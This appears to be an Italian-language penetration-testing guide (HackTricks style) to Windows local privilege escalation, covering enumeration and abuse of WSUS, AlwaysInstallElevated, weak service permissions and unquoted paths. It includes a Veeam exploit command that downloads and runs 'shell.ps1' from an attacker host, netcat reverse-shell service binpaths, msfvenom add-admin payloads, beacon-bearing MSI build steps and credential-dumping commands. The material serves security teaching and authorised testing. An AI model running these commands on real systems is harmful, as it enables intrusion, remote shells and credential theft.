# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Miglior strumento per cercare i vettori di Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Teoria iniziale su Windows

### Access Tokens

**Se non sai cosa sono Windows Access Tokens, leggi la seguente pagina prima di continuare:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Consulta la seguente pagina per maggiori informazioni su ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Se non sai cosa sono gli integrity levels in Windows dovresti leggere la seguente pagina prima di continuare:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Ci sono diverse cose in Windows che potrebbero **impedirti di enumerare il sistema**, eseguire eseguibili o persino **rilevare le tue attività**. Dovresti **leggere** la seguente **pagina** ed **enumerare** tutti questi **meccanismi di difesa** prima di iniziare l'enumerazione per il privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess processes launched through `RAiLaunchAdminProcess` can be abused to reach High IL without prompts when AppInfo secure-path checks are bypassed. Check the dedicated UIAccess/Admin Protection bypass workflow here:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

## System Info

### Version info enumeration

Verifica se la versione di Windows ha vulnerabilità note (verifica anche le patch applicate).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Questo [site](https://msrc.microsoft.com/update-guide/vulnerability) è utile per cercare informazioni dettagliate sulle Microsoft security vulnerabilities. Questo database contiene più di 4.700 security vulnerabilities, mostrando la **massive attack surface** che un ambiente Windows presenta.

**Sul sistema**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ha watson incorporato)_

**Localmente con informazioni sul sistema**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repo GitHub di exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ambiente

Ci sono credential/Juicy info salvate nelle env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Cronologia di PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### File di trascrizione di PowerShell

Puoi imparare come attivarlo in [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

I dettagli delle esecuzioni della pipeline di PowerShell vengono registrati, includendo i comandi eseguiti, le invocazioni dei comandi e porzioni di script. Tuttavia, i dettagli completi dell'esecuzione e i risultati dell'output potrebbero non essere catturati.

Per abilitarlo, segui le istruzioni nella sezione "Transcript files" della documentazione, optando per **"Module Logging"** invece di **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Per visualizzare gli ultimi 15 eventi dai Powershell logs puoi eseguire:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Viene catturato un record completo dell'attività e del contenuto dell'esecuzione dello script, garantendo che ogni blocco di codice sia documentato durante l'esecuzione. Questo processo preserva una traccia di audit esaustiva di ogni attività, utile per l'analisi forense e l'analisi di comportamenti malevoli. Documentando tutte le attività al momento dell'esecuzione, vengono forniti approfondimenti dettagliati sul processo.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Gli eventi di logging per lo Script Block possono essere visualizzati nel Windows Event Viewer al percorso: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Per visualizzare gli ultimi 20 eventi puoi usare:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Impostazioni Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Unità
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Puoi compromettere il sistema se gli aggiornamenti non vengono richiesti usando http**S** ma http.

Inizi controllando se la rete usa un aggiornamento WSUS non-SSL eseguendo il seguente comando in cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Oppure quanto segue in PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Se ricevi una risposta come una di queste:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
E se `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` o `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` è uguale a `1`.

Allora, **è sfruttabile.** Se l'ultima chiave di registro è uguale a 0, allora la voce WSUS verrà ignorata.

Per sfruttare questa vulnerabilità puoi usare strumenti come: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Si tratta di script di exploit MiTM weaponizzati per iniettare aggiornamenti 'fake' nel traffico WSUS non-SSL.

Leggi la ricerca qui:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Fondamentalmente, questo è il difetto che questo bug sfrutta:

> Se abbiamo la possibilità di modificare il proxy dell'utente locale, e Windows Updates usa il proxy configurato nelle impostazioni di Internet Explorer, allora abbiamo il potere di eseguire PyWSUS localmente per intercettare il nostro traffico e eseguire codice come utente elevato sul nostro asset.
>
> Inoltre, dato che il servizio WSUS usa le impostazioni dell'utente corrente, userà anche il relativo certificate store. Se generiamo un certificato self-signed per l'hostname WSUS e aggiungiamo questo certificato nel certificate store dell'utente corrente, saremo in grado di intercettare sia il traffico HTTP che HTTPS di WSUS. WSUS non utilizza meccanismi simili a HSTS per implementare una validazione di tipo trust-on-first-use sul certificato. Se il certificato presentato è trusted dall'utente e ha l'hostname corretto, verrà accettato dal servizio.

Puoi sfruttare questa vulnerabilità usando lo strumento [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (una volta reso disponibile).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Molti agent aziendali espongono una superficie IPC su localhost e un canale di update privilegiato. Se l'enrollment può essere forzato verso un server controllato dall'attaccante e l'updater si fida di una rogue root CA o di controlli del signer deboli, un utente locale può consegnare un MSI malevolo che il servizio SYSTEM installa. Vedi una tecnica generalizzata (basata sulla catena Netskope stAgentSvc – CVE-2025-0309) qui:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` espone un servizio su localhost su **TCP/9401** che processa messaggi controllati dall'attaccante, permettendo comandi arbitrari come **NT AUTHORITY\SYSTEM**.

- **Recon**: conferma il listener e la versione, per esempio, `netstat -ano | findstr 9401` e `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: posiziona una PoC come `VeeamHax.exe` con le DLL Veeam richieste nella stessa directory, poi attiva un payload SYSTEM tramite la socket locale:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Il servizio esegue il comando come SYSTEM.
## KrbRelayUp

Una vulnerabilità di **local privilege escalation** esiste in ambienti Windows **domain** in condizioni specifiche. Tali condizioni includono ambienti in cui **LDAP signing is not enforced,** gli utenti hanno self-rights che permettono loro di configurare **Resource-Based Constrained Delegation (RBCD),** e la possibilità per gli utenti di creare computer all'interno del dominio. È importante notare che questi **requisiti** sono soddisfatti utilizzando le **impostazioni predefinite**.

Trova l'**exploit** in [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Per maggiori informazioni sul flusso dell'attacco consulta [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Se** questi 2 valori di registro sono **abilitati** (il valore è **0x1**), allora utenti di qualsiasi livello di privilegio possono **installare** (eseguire) file `*.msi` come NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Se hai una sessione meterpreter puoi automatizzare questa tecnica usando il modulo **`exploit/windows/local/always_install_elevated`**

### PowerUP

Usa il comando `Write-UserAddMSI` di power-up per creare nella directory corrente un file MSI di Windows per elevare i privilegi. Questo script genera un installer MSI precompilato che richiede l'aggiunta di un utente/gruppo (quindi avrai bisogno di accesso GUI):
```
Write-UserAddMSI
```
Esegui semplicemente il binario creato per elevare i privilegi.

### MSI Wrapper

Leggi questo tutorial per imparare come creare un MSI wrapper usando questi strumenti. Nota che puoi avvolgere un "**.bat**" file se vuoi **solo** **eseguire** **linee di comando**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Creare MSI con WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Creare MSI con Visual Studio

- **Genera** con Cobalt Strike o Metasploit un **nuovo payload Windows EXE TCP** in `C:\privesc\beacon.exe`
- Apri **Visual Studio**, seleziona **Create a new project** e digita "installer" nella casella di ricerca. Seleziona il progetto **Setup Wizard** e clicca **Next**.
- Dai al progetto un nome, come **AlwaysPrivesc**, usa **`C:\privesc`** come percorso, seleziona **place solution and project in the same directory**, e clicca **Create**.
- Continua a cliccare **Next** finché non arrivi al passo 3 di 4 (choose files to include). Clicca **Add** e seleziona il Beacon payload che hai appena generato. Poi clicca **Finish**.
- Evidenzia il progetto **AlwaysPrivesc** in **Solution Explorer** e nelle **Properties**, cambia **TargetPlatform** da **x86** a **x64**.
- Ci sono altre proprietà che puoi modificare, come **Author** e **Manufacturer**, che possono rendere l'app installata più legittima.
- Fai click destro sul progetto e seleziona **View > Custom Actions**.
- Fai click destro su **Install** e seleziona **Add Custom Action**.
- Doppio click su **Application Folder**, seleziona il file **beacon.exe** e clicca **OK**. Questo assicurerà che il beacon payload venga eseguito non appena l'installer viene avviato.
- Sotto le **Custom Action Properties**, imposta **Run64Bit** su **True**.
- Infine, **compilalo**.
- Se viene mostrato l'avviso `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, assicurati di impostare la piattaforma su x64.

### Installazione MSI

Per eseguire l'**installazione** del file `.msi` maligno in **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Per sfruttare questa vulnerabilità puoi usare: _exploit/windows/local/always_install_elevated_

## Antivirus e Rilevatori

### Impostazioni di Audit

Queste impostazioni determinano ciò che viene **registrato**, quindi dovresti prestare attenzione
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, è interessante sapere dove vengono inviati i log
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** è progettato per la **gestione delle local Administrator passwords**, garantendo che ogni password sia **unica, randomised e aggiornata regolarmente** sui computer membri di un dominio. Queste password sono archiviate in modo sicuro in Active Directory e sono accessibili solo dagli utenti ai quali sono state concesse le opportune autorizzazioni tramite ACLs, consentendo loro di visualizzare le local admin passwords se autorizzati.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Se attivo, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

A partire da **Windows 8.1**, Microsoft ha introdotto una protezione avanzata per la Local Security Authority (LSA) per **bloccare** i tentativi da parte di processi non attendibili di **leggere la sua memoria** o iniettare codice, migliorando ulteriormente la sicurezza del sistema.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** è stato introdotto in **Windows 10**. Il suo scopo è proteggere le credenziali memorizzate su un dispositivo da minacce come gli attacchi pass-the-hash.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Credenziali memorizzate nella cache

**Le credenziali di dominio** sono autenticate dalla **Local Security Authority** (LSA) e utilizzate dai componenti del sistema operativo. Quando i dati di accesso di un utente vengono autenticati da un security package registrato, vengono normalmente stabilite le credenziali di dominio per l'utente.\
[**Maggiori informazioni sulle Credenziali memorizzate nella cache qui**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Utenti & Gruppi

### Enumerare Utenti & Gruppi

Dovresti verificare se uno dei gruppi a cui appartieni ha permessi interessanti.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Gruppi privilegiati

Se **appartieni a qualche gruppo privilegiato potresti riuscire a elevare i privilegi**. Scopri i gruppi privilegiati e come abusarne per ottenere l'elevazione dei privilegi qui:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipolazione dei token

**Scopri di più** su cos'è un **token** in questa pagina: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Consulta la pagina seguente per **scoprire i token interessanti** e come abusarne:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Utenti connessi / Sessioni
```bash
qwinsta
klist sessions
```
### Cartelle home
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Politica delle password
```bash
net accounts
```
### Ottieni il contenuto degli appunti
```bash
powershell -command "Get-Clipboard"
```
## Running Processes

### File and Folder Permissions

Prima di tutto, quando elenchi i processi, controlla se ci sono password nella **command line** del processo.\
Controlla se puoi **sovrascrivere qualche binary in esecuzione** o se hai permessi di scrittura sulla cartella dei binary per sfruttare eventuali [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Verifica dei permessi dei binari dei processi**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Verifica dei permessi delle cartelle dei binaries dei processi (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Estrazione di password dalla memoria

Puoi creare un dump di memoria di un processo in esecuzione usando **procdump** di sysinternals. Servizi come **FTP** hanno le **credentials in clear text in memory**, prova a fare il dump della memoria e leggere le credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Applicazioni GUI insicure

**Le applicazioni in esecuzione come SYSTEM possono permettere a un utente di avviare un CMD, o di sfogliare le directory.**

Esempio: "Windows Help and Support" (Windows + F1), cerca "command prompt", clicca su "Click to open Command Prompt"

## Servizi

Service Triggers permettono a Windows di avviare un servizio quando si verificano determinate condizioni (attività su named pipe/RPC endpoint, eventi ETW, disponibilità IP, arrivo di dispositivi, refresh GPO, ecc.). Anche senza i diritti SERVICE_START spesso puoi avviare servizi privilegiati attivando i loro trigger. Vedi tecniche di enumerazione e attivazione qui:

-
{{#ref}}
service-triggers.md
{{#endref}}

Ottieni l'elenco dei servizi:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Permessi

Puoi usare **sc** per ottenere informazioni su un servizio
```bash
sc qc <service_name>
```
È consigliabile avere il binario **accesschk** di _Sysinternals_ per verificare il livello di privilegi richiesto per ciascun servizio.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Si consiglia di verificare se "Authenticated Users" possono modificare qualsiasi servizio:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Abilitare il servizio

Se riscontri questo errore (ad esempio con SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Puoi abilitarlo usando
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Tieni presente che il servizio upnphost dipende da SSDPSRV per funzionare (per XP SP1)**

**Un'altra soluzione alternativa a questo problema è eseguire:**
```
sc.exe config usosvc start= auto
```
### **Modificare il percorso del binario del servizio**

Nello scenario in cui il gruppo "Authenticated users" possiede **SERVICE_ALL_ACCESS** su un servizio, è possibile modificare l'eseguibile del servizio. Per modificare ed eseguire **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Riavviare il servizio
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
I privilegi possono essere elevati tramite diverse autorizzazioni:

- **SERVICE_CHANGE_CONFIG**: Consente la riconfigurazione del binario del servizio.
- **WRITE_DAC**: Consente la riconfigurazione delle autorizzazioni, portando alla possibilità di modificare le configurazioni del servizio.
- **WRITE_OWNER**: Permette l'acquisizione della proprietà e la riconfigurazione delle autorizzazioni.
- **GENERIC_WRITE**: Eredita la capacità di modificare le configurazioni del servizio.
- **GENERIC_ALL**: Eredita anch'esso la capacità di modificare le configurazioni del servizio.

Per il rilevamento e lo sfruttamento di questa vulnerabilità, può essere utilizzato _exploit/windows/local/service_permissions_.

### Permessi deboli dei binari dei servizi

**Verifica se puoi modificare il binario eseguito da un servizio** o se hai **permessi di scrittura sulla cartella** dove si trova il binario ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Puoi ottenere tutti i binari eseguiti da un servizio usando **wmic** (non in system32) e verificare i tuoi permessi usando **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Puoi anche usare **sc** e **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Permessi di modifica del registro dei servizi

Dovresti verificare se puoi modificare qualche registro di servizio.\
Puoi **controllare** i tuoi **permessi** su un **registro** di servizio eseguendo:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Verificare se **Authenticated Users** o **NT AUTHORITY\INTERACTIVE** possiedono i permessi `FullControl`. Se sì, il binary eseguito dal servizio può essere alterato.

Per cambiare il Path del binary eseguito:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registro dei servizi: permessi AppendData/AddSubdirectory

Se possiedi questo permesso su un registro, significa che **puoi creare sotto-registri da questo**. Nel caso dei servizi Windows, questo è **sufficiente per eseguire codice arbitrario:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Percorsi dei servizi non racchiusi tra virgolette

Se il percorso di un eseguibile non è tra virgolette, Windows proverà ad eseguire ogni sottopercorso che precede uno spazio.

Ad esempio, per il percorso _C:\Program Files\Some Folder\Service.exe_ Windows tenterà di eseguire:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Elenca tutti i percorsi dei servizi non racchiusi tra virgolette, escludendo quelli dei servizi integrati di Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Puoi rilevare e sfruttare** questa vulnerabilità con metasploit: `exploit/windows/local/trusted\_service\_path` Puoi creare manualmente un service binary con metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Azioni di ripristino

Windows permette agli utenti di specificare azioni da eseguire se un servizio fallisce. Questa funzionalità può essere configurata per puntare a un binary. Se questo binary è sostituibile, potrebbe essere possibile una privilege escalation. Maggiori dettagli sono disponibili nella [documentazione ufficiale](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applicazioni

### Applicazioni installate

Controlla i **permessi dei binaries** (magari puoi sovrascriverne uno e ottenere privilege escalation) e delle **cartelle** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Permessi di scrittura

Controlla se puoi modificare qualche file di configurazione per leggere qualche file speciale oppure se puoi modificare qualche binario che verrà eseguito da un account Administrator (schedtasks).

Un modo per trovare cartelle/file con permessi deboli nel sistema è eseguire:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Persistenza/esecuzione autoload dei plugin di Notepad++

Notepad++ carica automaticamente qualsiasi plugin DLL nelle sue sottocartelle `plugins`. Se è presente un'installazione portatile/copiabile scrivibile, lasciare un plugin maligno permette l'esecuzione automatica di codice all'interno di `notepad++.exe` ad ogni avvio (inclusi `DllMain` e i callback dei plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Esecuzione all'avvio

**Verifica se puoi sovrascrivere qualche registry o binario che verrà eseguito da un altro utente.**\
**Leggi** la **pagina seguente** per saperne di più sulle **posizioni autorun interessanti per scalare i privilegi**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Driver

